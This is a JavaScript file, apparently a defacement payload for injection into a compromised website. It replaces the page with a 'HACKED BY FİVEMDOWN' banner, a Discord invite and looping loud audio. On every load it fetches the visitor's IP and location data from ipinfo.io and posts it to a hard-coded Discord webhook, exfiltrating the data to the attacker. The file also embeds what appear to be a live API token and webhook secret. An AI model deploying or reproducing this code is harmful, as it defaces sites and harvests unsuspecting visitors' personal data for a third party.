// body elementini temizle
document.body.innerHTML = '';
document.body.style.background = 'black';
document.body.style.color = '#00f';
document.body.style.fontFamily = 'Courier New, monospace';
document.body.style.textAlign = 'center';
document.body.style.margin = '0';
document.body.style.height = '100vh';
document.body.style.overflow = 'hidden';

// canvas oluştur
const canvas = document.createElement('canvas');
canvas.id = 'stars';
canvas.style.position = 'fixed';
canvas.style.top = '0';
canvas.style.left = '0';
canvas.style.zIndex = '-1';
document.body.appendChild(canvas);

const ctx = canvas.getContext('2d');
canvas.width = window.innerWidth;
canvas.height = window.innerHeight;

// yıldızları oluştur
const stars = Array.from({length: 150}, () => ({
  x: Math.random() * canvas.width,
  y: Math.random() * canvas.height,
  radius: Math.random() * 1.5,
  dy: Math.random() * 0.5 + 0.2
}));

function drawStars() {
  ctx.clearRect(0, 0, canvas.width, canvas.height);
  ctx.fillStyle = "white";
  stars.forEach(star => {
    ctx.beginPath();
    ctx.arc(star.x, star.y, star.radius, 0, Math.PI*2);
    ctx.fill();
    star.y += star.dy;
    if (star.y > canvas.height) {
      star.y = 0;
      star.x = Math.random() * canvas.width;
    }
  });
  requestAnimationFrame(drawStars);
}
drawStars();

// ip info elementini ekle
const pre = document.createElement('pre');
pre.id = 'ipinfo';
pre.textContent = 'Loading...';
pre.style.fontSize = '22px';
pre.style.lineHeight = '1.7';
pre.style.textShadow = '0 0 15px #00f, 0 0 25px #00f, 0 0 40px #00f';
pre.style.whiteSpace = 'pre-wrap';
pre.style.marginTop = '30px';
document.body.appendChild(pre);

// discord container
const discordContainer = document.createElement('div');
discordContainer.id = 'discord-container';
discordContainer.style.display = 'flex';
discordContainer.style.justifyContent = 'center';
discordContainer.style.gap = '20px';
discordContainer.style.marginTop = '40px';
discordContainer.style.marginBottom = '10px';
document.body.appendChild(discordContainer);

// resimleri ekle
const images = [
  "https://media.discordapp.net/attachments/1348698865565565073/1397013984451887124/image.png",
  "https://media.discordapp.net/attachments/1313231147282600099/1412569201016573952/image.png",
  "https://media.discordapp.net/attachments/1313231147282600099/1412569285095719103/image.png"
];

images.forEach(src => {
  const img = document.createElement('img');
  img.className = 'discord-logo';
  img.src = src;
  img.style.width = '250px';
  img.style.verticalAlign = 'middle';
  img.style.filter = 'drop-shadow(0 0 8px #00f)';
  discordContainer.appendChild(img);
});

// Hacked by text
const hackedBy = document.createElement('span');
hackedBy.id = 'hacked-by';
hackedBy.textContent = ' HACKED BY FİVEMDOWN';
hackedBy.style.fontSize = '45px';
hackedBy.style.color = '#00f';
hackedBy.style.textShadow = '0 0 20px #00f, 0 0 40px #00f, 0 0 80px #00f';
hackedBy.style.letterSpacing = '2px';
hackedBy.style.display = 'block';
document.body.appendChild(hackedBy);

// Discord link
const discordLink = document.createElement('a');
discordLink.id = 'discord-link';
discordLink.href = 'https://discord.gg/fivemdown';
discordLink.textContent = 'https://discord.gg/fivemdown';
discordLink.target = '_blank';
discordLink.style.fontSize = '48px';
discordLink.style.color = '#00f';
discordLink.style.textShadow = '0 0 20px #00f, 0 0 40px #00f, 0 0 80px #00f';
discordLink.style.textDecoration = 'none';
discordLink.style.fontWeight = 'bold';
discordLink.style.letterSpacing = '2px';
discordLink.style.display = 'inline-block';
discordLink.style.marginTop = '15px';
discordLink.style.marginBottom = '15px';
document.body.insertBefore(discordLink, hackedBy);

// audio
const audio = document.createElement('audio');
audio.id = 'audio-player';
audio.src = "https://cdn.discordapp.com/attachments/1323494216852308008/1412543226468110346/Moscow_Moscow_missile_meme_earrape.mp3";
audio.autoplay = true;
audio.loop = true;
audio.muted = true;
document.body.appendChild(audio);

window.addEventListener('click', () => {
  audio.play();
  audio.muted = false;
});

// IP fetch ve Discord webhook işlemleri
fetch("https://ipinfo.io/json?token=8d7365019dc710")
  .then(r => r.json())
  .then(data => {
    pre.textContent = JSON.stringify(data, null, 2);

    const webhookURL = "https://discord.com/api/webhooks/1412165143961407570/rNvbuXQPj9VoWSffMDT8ySmCKgRrUkKW0LaHXEqDLqW1d67C9A1ikJB64NRRjt-Fvxhi";
    const payload = { content: "Bir kullanıcı siteyi açtı!\nIP Bilgisi:\n" + JSON.stringify(data, null, 2) };
    fetch(webhookURL, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(payload) });
  })
  .catch(() => { pre.textContent = "Bilgiler alınamadı."; });
